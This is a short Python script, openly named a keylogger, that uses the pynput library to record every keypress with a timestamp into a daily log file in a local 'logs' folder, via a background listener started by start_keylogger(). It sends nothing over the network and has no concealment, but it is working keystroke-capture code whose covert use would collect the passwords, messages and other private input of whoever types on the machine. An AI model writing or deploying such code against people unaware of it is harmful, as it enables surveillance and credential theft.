from pynput import keyboard
import os
from datetime import datetime

LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
log_file = os.path.join(LOG_DIR, f"log_{datetime.now().date()}.txt")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - [{key}]\n")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
